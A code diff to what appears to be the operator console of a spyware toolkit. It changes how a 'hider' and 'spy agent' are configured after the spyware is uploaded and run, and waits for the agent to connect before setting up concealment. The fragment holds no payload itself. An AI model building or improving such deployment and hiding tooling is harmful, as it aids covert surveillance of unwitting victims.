@@ -309,7 +309,7 @@ class UI:
         print_res_str(res)
         self.ctx.cont_ident += 1
 
-    def setup(self, targetPath, imagePath, mountPath):
+    def setup(self, targetPath, imagePath='', mountPath=''):
         """
         USAGE: setup <targetPath> <imagePath> <mountPath>
         Set hider path and other params in manager and spyware (if exists)
@@ -325,12 +325,15 @@ class UI:
             )
         print_res_str(res)
         LOG(f"Manager hider set")
+        LOG(f"Manager mount set")
         spy = self.ctx.selected_operation.spyAgent
         if not spy:
             return
         res = spy.hider_setup(targetPath, imagePath, mountPath)
         print_res_str(res)
         LOG(f"Spyware hider set")
+        LOG(f"Spyware mount set")
+        return res
 
     def check_ready(self):
         if not self.is_op_active():
@@ -492,8 +495,9 @@ class UI:
         self.manager("write_file", hiderHome, hiderTarg)
         self.setup(hiderTarg, "f", "f")
         self.uprun(spyHome, spyTarget)
-        time.sleep(3)
-        self.setup(hiderTarg, 'f', 'f')
+        while not self.ctx.selected_operation.spyAgent:
+            time.sleep(1)
+        self.setup(hiderTarg, 'img.iso', 'mont')
         print('Done.')
 
     def list_ops_names(self):
